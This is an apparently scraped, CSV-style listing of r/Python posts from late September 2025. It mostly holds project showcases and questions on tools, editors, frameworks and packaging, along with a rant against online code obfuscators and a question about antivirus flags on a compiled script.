4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1ntwkn1,Best editor/IDE for starting Python in a portfolio management class?,swissmarketguy,4,37,2025-09-29 22:47:21,https://www.reddit.com/r/Python/comments/1ntwkn1/best_editoride_for_starting_python_in_a_portfolio/,"Hello everyone,

I have a question regarding which editor or IDE I should use. For some context: I am just starting with Python for a university class (Backtesting for Portfolio Management). The course provides an introduction to programming for portfolio management applications, in particular the backtesting of quantitative investment strategies using Python.

I have some experience coding, mainly with R and RStudio over the past three years at university and work, but I am completely new to Python. While researching online, I saw that VS Code is often recommended as an editor, while PyCharm is considered a full IDE. Which one should I use, and why? Are there better options I should consider?

Thank you!"
1ntvcta,"Scroll Art (animated ASCII art, for beginner programmers and hobbyists)",AlSweigart,3,5,2025-09-29 21:56:50,https://www.reddit.com/r/Python/comments/1ntvcta/scroll_art_animated_ascii_art_for_beginner/,"## What My Project Does

Scroll art is moving ASCII art produced by stdout text printed from a loop, animated as the text scrolls up the terminal. It's especially useful as creating computing projects for beginner programmers. Because it only uses text, no environment setup or additional libraries are needed and scroll art can be made in every programming language. I've published examples of scroll art on https://scrollart.org, but now I've also included Python implementations in the `scrollart` package.

Install: pip install scrollart

To view the list of scroll art: python -m scrollart --help

Example: python -m scrollart starfield

Or copy/paste the code into a single file from here: https://raw.githubusercontent.com/asweigart/scrollart/refs/heads/main/python-package/scrollart/__init__.py

PyPI page: https://pypi.org/project/scrollart/

Git repo: https://github.com/asweigart/scrollart

Blog post: https://inventwithpython.com/blog/scroll-art-python-package.html

View the scroll art online (through JavaScript viewer): https://scrollart.org/

## Target Audience

Beginners, but also instructors looking for project ideas for their students.

## Comparison

This isn't quite ASCII art (since it's animated) and it's not quite curses (since you can't arbitrarily move the text cursor around the screen). I was surprised there wasn't already a name for this."
1ntnbgn,uv-ship: a CLI tool for shipping with uv,Ruths138,49,6,2025-09-29 16:52:51,https://www.reddit.com/r/Python/comments/1ntnbgn/uvship_a_cli_tool_for_shipping_with_uv/,"Hello¬†[r/Python](https://www.reddit.com/r/Python/).  
I know, I know, there are several release-bumping tools out there, but none integrate with uv the way I would like them to. They also feel kind of bloated for what I need them to do. I simply wanted to use¬†`uv version`¬†to update my project metadata, paired with a small pipeline that safeguards the process and ships the changes + version tag to the repo.

If you're curious, please check out¬†[**uv-ship**](https://floraths.github.io/uv-ship/)

**What My Project Does**

>

>**preflight checks**: guard your release workflow by verifying branch, tags, and a clean working tree before shipping.

>**changelog generation**: auto-builds changelog sections from commits since the latest tag.

>**one-shot release**: stage, commit, tag, and push in a single step.

>**dry-run mode**: preview every action before making changes.

**Target Audience**¬†

maintainers of uv-managed projects with strict release workflows.

**Comparison**  
uv-ship is similar in scope to¬†[bump-my-version](https://callowayproject.github.io/bump-my-version/)¬†but it integrates with uv out-of-the-box. For example, if you use bump-my-version you need to set up the following workflow:

1. execute version bump with¬†`bump-my-version bump minor`
2. include a pre-commit hook that runs¬†`uv sync`
3. tell bump-my-version that pyproject.toml and uv.lock need to be committed
4. create the tag and push it manually

bump-my-version offers automation with pre- and post-commit hooks, but it does not evaluate if the tag is safe to be pushed (all requirements met for release?)

all those steps are completed and validated during the uv-ship pipeline:

the command syntax for the same operation (and some more) is:¬†`$ uv-ship next minor`

you can play around in¬†`--dry-run`¬†mode to see the CLI in action. I would love your feedback  
[https://github.com/floRaths/uv-ship](https://github.com/floRaths/uv-ship)"
1ntmao7,Why would I not use Visual Studio code,saddickstic,281,173,2025-09-29 16:14:14,https://www.reddit.com/r/Python/comments/1ntmao7/why_would_i_not_use_visual_studio_code/,"I‚Äôm doing a college project that wants me to use Mobaxterm for my terminal and WinSCP to transfer files and I‚Äôm using a college provided Linux server. In mobaxterm I use a code editor called nedit. 

I‚Äôve used VSC on a project before and it was so much easier , and everything was built in one. I told the professor and he said well you could but I think this is better. 

I‚Äôm confused how this slow multi step process can be better than VSC?

(This is a bioinformatics project using biopython)"
1ntiovm,Git Deployer (Python),optinsoft,0,7,2025-09-29 13:55:56,https://www.reddit.com/r/Python/comments/1ntiovm/git_deployer_python/,"I wrote a python module [Git Deployer](https://github.com/optinsoft/git-deployer).

# What my project does

Git Deployer allows you to automate the deployment of generated static sites (documentation, help guides, etc.) using Git.

# Target Audience

I hope it will be useful for those who regularly deploy generated (for example, with MkDocs or Sphinx) static websites using Git.

# Comparison

Compared to manual deployment using Git, using Git Deployer offers the following advantages:

* You don't need to navigate to the directory with the generated website and run git add/commit/push. Everything is done with a single command: `deploy web\_site`.
* There is a configuration file, `deploy\_config.yml`, where you can specify the remote repository, branch, and other parameters. Git Deployer will then automatically initialize a Git repository in the web\_site directory.
* The configuration file can be added to the Git repository of your Sphinx documentation project. This means if you need to deploy the project on a new device, you just need to install Git Deployer via pip, and you can immediately run deploy web\_site."
1nti5ar,Why Today's Python Developers are Embracing Type Hints,BeamMeUpBiscotti,0,19,2025-09-29 13:33:07,https://www.reddit.com/r/Python/comments/1nti5ar/why_todays_python_developers_are_embracing_type/,"Python is incredibly popular in fields where speedy experimentation and iteration are critical, and where developers are coming from a broad range of STEM backgrounds, not necessarily computer science. But as projects grow from experiments to production systems, that same flexibility can become a liability.

Saying ""if you wanted a production system you should have used a different language"" or ""just rewrite it in _"" is missing the point - Python's optional typing features allow projects to gradually adopt type annotations & type checking as they mature, improving reliability without requiring an expensive/disruptive rewrite.

Blog post: https://pyrefly.org/blog/why-typed-python/"
1ntgidy,False positives or malicious trojans in python script?,Big_Bicycle_5003,0,25,2025-09-29 12:21:09,https://www.reddit.com/r/Python/comments/1ntgidy/false_positives_or_malicious_trojans_in_python/,"Hi, my friend sent me a script he made in python which I jokingly scanned with virustotal which showed 28 threats, most of which were labeled as ‚ÄúTrojan‚Äù. I think it‚Äôs important to note he encrypted this with nuitka + upx so it could be false positives. What do you guys thinks? And yes, I have run it and i scanned it with malwarebytes and nothing showed up."
1ntexpa,Please review my projects and tell me if they are strong enough to get a job.,Extension_Sector_320,0,4,2025-09-29 10:59:38,https://www.reddit.com/r/Python/comments/1ntexpa/please_review_my_projects_and_tell_me_if_they_are/,"‚Ä¢ ***QR Code Generator (Flask, JavaScript, AWS S3, Docker****)*

*-* Built a full-stack web app that generates QR codes from URLs.

\- Integrated AWS S3 for secure storage of generated codes.

\- Containerized the application with Docker for easy deployment.

‚Ä¢ ***Weather Forecast Website*** **(HTML, CSS, JavaScript)**

\- Developed a responsive website to display real-time weather forecasts.

\- Integrated third-party weather APIs for accurate data retrieval.

‚Ä¢ ***Email Spam Detection*** **(Python, Decision Trees, Logistic Regression)**

\- Implemented supervised learning models to classify emails as spam or

not spam.

\- Achieved reliable accuracy by comparing performance of multiple

algorithms.

‚Ä¢ ***Netflix Clone*** **(HTML and CSS)**

\- Replicated the front-end design of the original Netflix site."
1ntc5rg,"holm: Next.js developer experience in Python, without JS, built on FastAPI",volfpeter,51,16,2025-09-29 07:58:06,https://www.reddit.com/r/Python/comments/1ntc5rg/holm_nextjs_developer_experience_in_python/,"Hi all!

I've just released `holm` and wanted to show it you. It is the last piece of the FastAPI web development stack I started creating with [FastHX](https://volfpeter.github.io/fasthx/) and [htmy](https://volfpeter.github.io/htmy/).

You can learn all about it in the docs: https://volfpeter.github.io/holm/. If you've used Next.js before, you will find `holm` very familiar.

The documentation has a couple of short documents and guides covering all the basics: creating your first app, adding HTMX, error rendering, customization, setting up AI assistance. The rest is standard FastAPI, `htmy`, and FastHX.

### What the project does?

It's a web development framework that brings the Next.js developer experience to Python (without JavaScript dependencies).

### Key features

- Next.js-like developer experience with **file-system based routing** and page composition.
- Standard **FastAPI** everywhere, so you can leverage the entire FastAPI ecosystem.
- JSX-like syntax with async support for components, thanks to `htmy`.
- First class **HTMX support** with FastHX.
- Async support everywhere, from APIs and dependencies all the way to UI components.
- Support for both JSON and HTML (server side rendering) APIs.
- No build steps, just server side rendering with **fully typed** Python.
- Stability by building only on the core feature set of dependent libraries.
- Unopinionated: use any CSS framework for styling and any JavaScript framework for UI interactivity (HTMX, AlpineJS, Datastar, React islands).

### Target audience

Everyone who wants to conveniently create dynamic websites and application in Python.

I hope you'll give `holm` a go for your next web project."
1ntb4a5,Playing Penney's Game Using Python,sadrasabouri,12,2,2025-09-29 06:48:09,https://www.reddit.com/r/Python/comments/1ntb4a5/playing_penneys_game_using_python/,"[Penney's game](https://en.wikipedia.org/wiki/Penney%27s_game), is a head/tail sequence generating game between two or more players. Player A selects a sequence of heads and tails (of length 3 or larger), and shows this sequence to player B. Player B then selects another sequence of heads and tails of the same length. A coin is tossed until either player A's or player B's sequence appears as a consecutive sub-sequence of the coin toss outcomes. The player whose sequence appears first wins. The cool thing about the game is that second person can wisely chose their sequence based on the first ones which highers their winning probability.

**What My Project Does**

Here we have implemented the game in command-line interface (CLI) using pure Python so to play around with the game and find out ways to chose that sequence wisely to win the game; Check it out and comment if you find a general winning strategies for first/second player for longer sequences.

**Target Audience**  
This project is mainly for:

* Python learners who want a fun CLI project to play with
* Math/game enthusiasts curious about probability games
* Anyone who enjoys experimenting with games

It‚Äôs an interactive fun/educational project.

**Comparison**  
Other implementations (e.g., [https://penneys.github.io/](https://penneys.github.io/)) are restricted to two players and fixed sequences of length 3. Our project extends this by supporting multiple players, variable sequence lengths, and a command-line interface for interactive play.

GitHub repo: [https://github.com/sepandhaghighi/penney](https://github.com/sepandhaghighi/penney)"
1nt6u36,üéµ TikTock Video Downloader,HyperrNuk3z,0,1,2025-09-29 02:40:12,https://www.reddit.com/r/Python/comments/1nt6u36/tiktock_video_downloader/,"# üöÄ Introducing¬†TikTock



Hey everyone! üëã

I‚Äôve been working on a Python project called TikTock ‚Äî a command-line tool that makes downloading TikTok videos simple, fast, and customizable.

# ‚úÖ What My Project Does

TikTock is a Python CLI downloader for TikTok videos. It supports:

* Single and multiple URLs
* Bulk downloads from .txt / .json files (including TikTok‚Äôs official data export)
* Watermark-free downloads
* Custom filename templates
* Logging and progress bars for smooth tracking



# üßë‚Äçüíª Target Audience

This project is mainly for:

* Data hoarders & archivists who want to bulk-save or preserve TikTok content
* Creators looking to back up their own TikToks without hassle
* Developers who want an open, flexible tool they can extend or integrate into workflows

# üîç Comparison

There are plenty of TikTok downloaders out there, but most fall short:

‚ùå Many are websites stuffed with ads or shady practices

‚ùå Others are closed-source with limited flexibility

TikTock is different:

‚úÖ 100% open-source and Python-based

‚úÖ Developer-friendly with rich customization (templates, chunk sizes, logging, etc.)

‚úÖ Transparent and hackable, so you can extend it however you like



‚ö° Pro tip: Download your videos now before Oracle buys it 



üëâ GitHub Repo: [TikTock on GitHub](https://github.com/Izaan17/TikTock)

If you find it useful, I‚Äôd love a ‚≠ê on GitHub! Feedback and feature requests are super welcome."
1nt3lqa,Monday Daily Thread: Project ideas!,AutoModerator,4,0,2025-09-29 00:00:32,https://www.reddit.com/r/Python/comments/1nt3lqa/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nstx1o,Showcase: Adaptive - open-source intelligent LLM router,botirkhaltaev,0,0,2025-09-28 17:18:26,https://www.reddit.com/r/Python/comments/1nstx1o/showcase_adaptive_opensource_intelligent_llm/,"**What My Project Does**

Adaptive is an intelligent router for LLM inference.

Instead of sending every request to a fixed model, it:

* Analyzes prompts in real time
* Estimates **task type, domain, and complexity**
* Routes to the most suitable model based on benchmarked performance

A common issue we saw with existing approaches is that they either:

* Base routing **solely on complexity scores**, which collapse everything into one dimension, or
* Use **very broad categories** like ‚Äúcode generation,‚Äù which ignore the nuance between planning, debugging, or writing simple snippets.

Adaptive takes a more granular approach. We use **NVIDIA‚Äôs Prompt Task and Complexity Classifier** for initial signals, but extend it with **model criteria** derived from benchmarks across task types, domains, and multiple complexity levels.

This lets us distinguish when a prompt needs high reasoning (e.g., planning or debugging) versus when a lightweight model is sufficient (e.g., writing boilerplate).

We are now integrating Google‚Äôs [UniRoute](https://arxiv.org/abs/2502.08773) and extending it by adding task complexity and domain-awareness to the error-vector method, so routing generalizes to unseen models while staying context-aware.

**Target Audience**

Adaptive is for developers and teams building AI products that need to balance **cost, quality, and reliability** in production.

**Comparison**

Most LLM routing today is naive:

* Route everything to a premium model ‚Üí high quality, but expensive
* Route everything to a smaller model ‚Üí cheap, but quality suffers
* Route based only on a single complexity score ‚Üí too coarse, misses nuance
* Use broad categories like ‚Äúcoding‚Äù ‚Üí ignores the difference between planning, debugging, and writing snippets

Adaptive differs by combining **granular task classification + domain signals + benchmark-driven model criteria** instead of static rules.

The result: **60‚Äì90% lower inference costs** while keeping quality high for workloads that actually demand complex reasoning.

**Repo (open source):** [github.com/Egham-7/adaptive](https://github.com/Egham-7/adaptive)  
**Website:** [llmadaptive.uk](https://llmadaptive.uk)

Would love feedback from others working on inference routing or multi-model orchestration."
1nstje8,Stop uploading your code to sketchy ‚Äúonline obfuscators‚Äù like freecodingtools.org,GuiltyAd2976,391,60,2025-09-28 17:03:25,https://www.reddit.com/r/Python/comments/1nstje8/stop_uploading_your_code_to_sketchy_online/,"So I googled one of those ‚Äúfree online Python obfuscor things‚Äù (say, freecodingtools.org) and oh boy‚Ä¶ I have to rant for a minute.

You sell pitch is just ‚Äújust paste your code in this box and we‚Äôll keep it for you.‚Äù Right. Because clearly the best way to keep your intellectual property is to deposit it on a who-knows-what site you‚Äôve never ever known, owned and operated people you‚Äôll never ever meet, with no idea anywhere your source goes. Completely secure.

Even if you think the site will not retain a copy of your code, the real ‚Äúobfuscation‚Äù is going to be farcical. We discuss base64, XOR, hex encoding, perhaps zlib compression, in a few spaghetti exec function calls. This isn‚Äôt security, painting and crafts. It can be unwritten anybody who possesses a ten-minute-half-decent Google. But geez, at least it does look menacing from a first glance, doesn‚Äôt it?

You actually experience a false sense of security and the true probability of having just opened your complete codebase to a dodgy server somewhere. And if you‚Äôre particularly unlucky, they‚Äôll mail back to you a ‚Äúprotected‚Äù file that not only includes a delicious little backdoor but also one you‚Äôll eagerly send off to your unsuspecting users. Well done, you just gave away supply-chain malware for free.

If you truly do want to protect code, there are actual tools for it. Cython runs to C extensions. Nuitka runs projects to native executables. Encrypts bytecode and does machine binding. Not tricks, but at least make it hard and come from people who don‚Äôt want your source comed to be pushed to their private webserver. And the actual solution? Don‚Äôt push secrets to begin with. Put keys and sensitive logic on a server people can‚Äôt touch.

So yeh‚Ä¶ do not the next time your eyes glaze over at ‚Äújust plug your Python code into our free web obfuscator.‚Äù Unless your security mindset is ‚Äúkeep my younger brother from cheating and reading my homework,‚Äù congratulations, your secret‚Äôs safe."
1nssyap,AI-powered CCTV using YOLOv8 for detection and ChatGPT for classification,ChardEmbarrassed7304,0,1,2025-09-28 16:39:21,https://www.reddit.com/r/Python/comments/1nssyap/aipowered_cctv_using_yolov8_for_detection_and/,"I'm sharing my project, the Home Security CCTV Monitor. 

This is a real-time home surveillance tool that uses YOLOv8 for object detection and ChatGPT (or another AI API) as the ‚Äúbrains‚Äù to interpret what the camera sees.

What My Project Does:

This system watches live video and classifies events into NORMAL, CAUTION, or THREAT. It‚Äôs designed to go beyond motion detection by interpreting behavior, not just presence.

Key features:

* YOLOv8 Object Detection: Detects people, cars, trucks, and more in real time.
* Behavior Rules + AI Reasoning:
   * Walking past on sidewalks ‚Üí CAUTION
   * Approaching the house/camera ‚Üí THREAT
   * Walking away ‚Üí CAUTION
   * Loitering near or interacting with cars ‚Üí THREAT
* AI Event Summaries: YOLO handles detection, ChatGPT interprets context and generates concise security-style logs.
* Timeline Logging: Keeps memory of the last 10 alerts with status and short stories.
* Snapshots: Automatic evidence images saved into a detections folder.
* Tkinter GUI: Live video feed, status panel, and event log window.

Target Audience:

This is aimed at hobbyists, Python developers, and DIY security enthusiasts who want to explore computer vision + AI for real-world applications. It‚Äôs also useful for anyone curious about extending YOLO beyond raw detection into behavior-aware security.

Comparison:

Traditional CCTV or motion detection cameras only capture footage. This project adds a reasoning layer: YOLOv8 detects, and ChatGPT classifies behaviors as normal, caution, or threat. It essentially gives the camera a way to ‚Äúthink‚Äù about what it sees.

Source Code:  
GitHub Repository: [https://github.com/xogie/Security-Camera-w-AI](https://github.com/xogie/Security-Camera-w-AI)"
1nsj68m,Are the Xcode command line tools required for the precompiled Python from python.org?,gernophil,0,13,2025-09-28 08:33:28,https://www.reddit.com/r/Python/comments/1nsj68m/are_the_xcode_command_line_tools_required_for_the/,"The title probably says it all. A lot of internet sources claim that Xcode CLTs are required to install Python. However, this is probably true, if you want to install it from Homebrew or other sources that install it from source. But the precompiled version from Python.org should not be in need of these tools, am I right?"
1nsj4cy,"Ducky: A free, open-source, all-in-one networking & security toolkit for Windows.",initCMD,18,5,2025-09-28 08:30:13,https://www.reddit.com/r/Python/comments/1nsj4cy/ducky_a_free_opensource_allinone_networking/,"Hey everyone, A while ago, I started working on a project called¬†**Ducky**, and I'm blown away by the support and feedback I've received. We recently passed a new star milestone on GitHub, and I just wanted to say a huge¬†**thank you**¬†to everyone who has shown interest, offered feedback, or contributed. It means the world to me.

# What My Project Does

Ducky is a free, open-source desktop application that consolidates the essential tools of a network engineer or security enthusiast into a single, easy-to-use interface. Instead of juggling separate applications for terminal connections, network scanning, and diagnostics (like PuTTY, Angry IP Scanner, etc.), Ducky provides a unified workspace to streamline your workflow. Its core features include a tabbed terminal (SSH, Telnet, Serial), an SNMP-powered network topology mapper, a port scanner, and a suite of security utilities like a CVE lookup and hash calculator.

# Target Audience

Ducky is built for anyone who works with network hardware and infrastructure. It's intended to be a serious, daily-use tool for professionals, but it's also simple enough for learners.

* **For Production:**¬†Network Engineers & Administrators for daily tasks like configuring switches and routers, troubleshooting connectivity, and documenting network layouts. Cybersecurity professionals can also use it for reconnaissance and analysis.
* **For Learning:**¬†Students and hobbyists (e.g., studying for CompTIA Network+ or CCNA) can use Ducky as a free, hands-on tool to explore and interact with real or virtual network devices.

# Comparison

Ducky aims to fill a gap between powerful but expensive commercial tools and single-function free utilities.

* **Compared to tools like SecureCRT or MobaXterm Pro:**¬†Ducky provides many of the most-used features (tabbed multi-protocol terminal, session management) but is completely free and open-source. While it doesn't have every advanced feature of those paid tools yet, it covers the daily essentials in a clean, modern interface.
* **Compared to using separate free tools (like PuTTY + Nmap + a separate subnet calculator):**¬†Ducky's main advantage is integration. The tools are designed to work together. For example, you can discover a device on the Topology Map, click it to see its details, and then launch an SSH session to it without ever leaving the application. This creates a much smoother and faster workflow.

**How You Can Help:**

The best way you can support the project right now is by giving it a star on GitHub! It provides a huge motivation boost and helps more people discover the tool.

**Easy Download (No Python Needed!)**

I've also launched a small website for the project. You can now download a¬†**pre-packaged¬†.exe¬†file**¬†directly from the site‚Äîno need to install Python or any dependencies.

* **GitHub Repository (Please leave a star! ‚≠ê):**¬†[https://github.com/thecmdguy/Ducky](https://www.google.com/url?sa=E&q=https%3A%2F%2Fgithub.com%2Fthecmdguy%2FDucky)
* **Website with Direct Download:**¬†[ducky.ge](https://ducky.ge/#download)

Thank you all again for the support"
1nsiw9i,Python library without external imports only built in,Sinan_Dede,0,5,2025-09-28 08:15:36,https://www.reddit.com/r/Python/comments/1nsiw9i/python_library_without_external_imports_only/,"Hey everyone üëã

I just created a new open-source repo called **Advanced Text Processor**.  
The idea is simple but with a twist:

üîπ We build a Python text processing library (cleaning, tokenization, n-grams, vectorization, dataset handling, etc.)  
üîπ **Rule:** No external libraries allowed. Everything must be done with Python‚Äôs built-in standard library.  
üîπ Purpose: This is not about user acquisition or making money ‚Äî it‚Äôs about practice, collaboration, and seeing how far we can push the limits of ""pure Python"".  

It‚Äôs open for contributions and discussions.  
Check it out here:  https://github.com/SinanDede/advanced_text_processor

Would love your feedback and ideas üôå"
1nsi5sh,NiceGUI Component-Based Boilerplate: A scalable architecture for complex Python web UIs,Defiant-Comedian3967,27,4,2025-09-28 07:27:23,https://www.reddit.com/r/Python/comments/1nsi5sh/nicegui_componentbased_boilerplate_a_scalable/,"Hello r/Python,

I'm sharing my project, the **NiceGUI Component-Based Boilerplate**. I'm actively looking for feedback from experienced Python developers on its design and architecture.

This is a complete application boilerplate built using the **NiceGUI** framework, which allows the creation of web-based UIs using **pure Python & HTML/CSS/JS**. My project provides a structure for a larger, multi-page NiceGUI application.

**What My Project Does:**

This template introduces a modern structure to simplify building and maintaining complex NiceGUI apps, moving beyond single-file examples.

Key structural features:

* **Modular Component System:** UI pages and major elements are reusable Python classes/functions, managing their own layout and logic.
* **Service Layer:** Business logic (e.g., data handling, API calls) is strictly separated into a dedicated `services/` directory, keeping UI code clean.
* **Clean Starter Layout:** Provides a production-ready, responsive layout with a collapsible sidebar and consistent routing.

**Target Audience:**

This is aimed at **experienced Python developers** and **teams** who need a structured foundation for building production-grade or highly-functional internal tools with NiceGUI. It's ideal for those focused on **scalability and maintainability**.

**Comparison:**

Standard NiceGUI documentation often focuses on simple, single-file scripts. This boilerplate differs by offering a full-scale, opinionated structure similar to what is used in modern web development frameworks.

**Source Code:**

**GitHub Repository:** [`https://github.com/frycodelab/nicegui-component-based`](https://github.com/frycodelab/nicegui-component-based)

I welcome all feedback on the architectural patterns and how this template can be improved for real-world use cases."
1nsceni,Choosing a C++ to Python wrapper: Boost.Python vs pybind11?,gosh,25,12,2025-09-28 01:57:29,https://www.reddit.com/r/Python/comments/1nsceni/choosing_a_c_to_python_wrapper_boostpython_vs/,"I've built a code search tool as a terminal application in C++, and I'm now working on packaging it as a Python library. I need to create a Python wrapper for the C++ core.

My project already uses Boost, which has its own Python wrapper (Boost.Python). However, from what I've read, most people seem to be using pybind11.

For those who have experience with this, what are the pros and cons of the different options?

The search tool: https://github.com/perghosh/Data-oriented-design/releases/tag/cleaner.1.0.6"
1nsa5ae,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,9,2,2025-09-28 00:00:35,https://www.reddit.com/r/Python/comments/1nsa5ae/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1ns79ep,Python Data Model Exercise,Sea-Ad7805,0,0,2025-09-27 21:45:50,https://www.reddit.com/r/Python/comments/1ns79ep/python_data_model_exercise/,"An exercise to help build the right mental model for Python data, the ‚ÄúSolution‚Äù link uses memory_graph to visualize execution and reveal what‚Äôs actually happening.

What is the output of this program?
```
import copy

mydict = {1: [], 2: [], 3: []}
c1 = mydict
c2 = mydict.copy()
c3 = copy.deepcopy(mydict)
c1[1].append(100)
c2[2].append(200)
c3[3].append(300)

print(mydict)
# --- possible answers ---
# A) {1: [], 2: [], 3: []}
# B) {1: [100], 2: [], 3: []}
# C) {1: [100], 2: [200], 3: []}
# D) {1: [100], 2: [200], 3: [300]}
```

- [Solution](https://memory-graph.com/#codeurl=https://raw.githubusercontent.com/bterwijn/memory_graph_videos/refs/heads/main/exercises/exercise1.py&play)
- [Explanation](https://github.com/bterwijn/memory_graph?tab=readme-ov-file#python-data-model)
- [More exercises](https://www.reddit.com/r/Python_memory_graph/)"
1ns6wst,Python in ChemE,fatimalizade,8,26,2025-09-27 21:30:19,https://www.reddit.com/r/Python/comments/1ns6wst/python_in_cheme/,"Hi everyone, I‚Äôm doing my Master‚Äôs in Chemical and Energy Engineering and recently started (learning) Python, with a background in MATLAB. As a ChemE student I‚Äôd like to ask which libraries I should focus on and what path I should take. For example, in MATLAB I mostly worked with plotting and saving data. Any tips from engineers would be appreciated :)"
1ns6jea,"Catch Code Changes as Git Diffs, Not Test Failures",nifunif4,12,5,2025-09-27 21:14:11,https://www.reddit.com/r/Python/comments/1ns6jea/catch_code_changes_as_git_diffs_not_test_failures/,"    from difflogtest import register_unittest, get_logger
    logger = get_logger()
    
    @register_unittest(logger=logger)
    def test_my_function():
        """"""Test function that produces complex output.""""""
        logger.info(""Starting complex computation..."")
        logger.rule(""Processing Data"")
    
        result = my_complex_function() # This can have all the logs you want
    
        logger.success(""Computation completed successfully"")
        logger.info(f""Result shape: {result.shape}"")
    
        return result

TL;DR: [difflogtest](https://github.com/affromero/DiffLogTest) monitors how your functions behave by tracking their logs and results in git files. When code changes unexpectedly, you see the differences right in your git status; no test failures, just behavioral drift detection. Just add the decorator to any function, and execute `run-unittests`. It will redirect all the logs to a text file.

**What My Project Does**

It is a behavioral consistency framework that automatically captures both function logs and return values, storing them as organized text files that serve as behavioral baselines. Instead of traditional test assertions, it uses git diffs to show when function behavior changes unexpectedly during development. This lets you distinguish between intentional improvements and regressions, with built-in normalization filtering out noise like timestamps and memory addresses. 

**Target Audience**

We built for fast-moving startups and ML teams where constant experimentation happens but core functionality needs stability. It's perfect for environments where multiple developers iterate rapidly on shared codebases, and you want to encourage prototyping while catching behavioral drift. If you're in a startup where ""move fast and break things"" is the mantra but some things really shouldn't break, this provides the guardrails you need. We quickly catch bugs because we know exactly where to look when some log deviates.

**Comparison**

While pytest frameworks validate final results through explicit checks, difflogtest monitors the entire execution process: capturing logging, intermediate steps, and outputs for a complete behavioral picture. If you care more about how functions behave throughout execution rather than just final results, this gives you comprehensive monitoring without the test writing overhead. 

I'm not sure if this already exists, but for our use case we needed something like this and didn't find a good alternative. Happy to hear if someone knows of similar tools."
1ns3v4y,Saruph: A pixel-based terminal snake game,areebnaqash,14,1,2025-09-27 19:22:38,https://www.reddit.com/r/Python/comments/1ns3v4y/saruph_a_pixelbased_terminal_snake_game/,"# [Saruph | GitHub](https://github.com/areebnaqash/Saruph)

  
Hey! I recently created a pixel-based terminal snake game in Python, as my final project for CS50x. I thought I'd share this little game here.



# What My Project Does

Nothing original, I suppose. It's just the basic snake game with the twist that it's inside a terminal and has some pixel art for sprites.



# Target Audience

Anyone. Yes, it's a toy project. I wanted to see how graphics could be manipulated inside a terminal.



# Comparison

As stated above. Unlike most terminal-based snake games, it has some sprites, that's all."
1ns3bts,I built a UI fiddle for Python Devs...,Wonderful-Today-497,0,2,2025-09-27 19:00:48,https://www.reddit.com/r/Python/comments/1ns3bts/i_built_a_ui_fiddle_for_python_devs/,"I mainly do front end oriented projects, mainly with a specific Python web framework, and I got the idea of putting something together to make prototyping UI components faster with minimal setup. 

\# What My Project Does

Buridan Play is basically the same as other fiddle apps like tailwind play, code pen, etc etc but build specifically for Reflex framework. It lets users to quickly prototype or visualize no-to-complicated components directly in the browser. No need to create new projects, or setup any environment. 

\# Target Audience

Any Python dev since the the app is built with only python and the UI components are built/designed with python as well.

\# Comparison

Much like other JS/HTML fiddles like tailwind play or code pen

Source Video: [https://youtu.be/CANZVUGl0Cw](https://youtu.be/CANZVUGl0Cw)

Framework Used to build: [https://github.com/reflex-dev/reflex](https://github.com/reflex-dev/reflex)"
1nruwa7,PySide vs. Avalonia: Which for a Solo Dev Building an Electrical Panel Designer ?,Responsible-Word-137,62,18,2025-09-27 13:12:03,https://www.reddit.com/r/Python/comments/1nruwa7/pyside_vs_avalonia_which_for_a_solo_dev_building/,"Hey,

I'm a solo dev dipping into desktop app territory for the first time, and I'm torn between PySide (Python + Qt) and Avalonia (.NET/C#). The app? A tool for designing electrical panels: users drag-drop hierarchical elements (panels ‚Üí racks ‚Üí components) on a canvas, then auto-generate invoices (PDFs with BOMs). I'd like a modern UI‚Äîdark mode, smooth animations, rounded edges, the works.

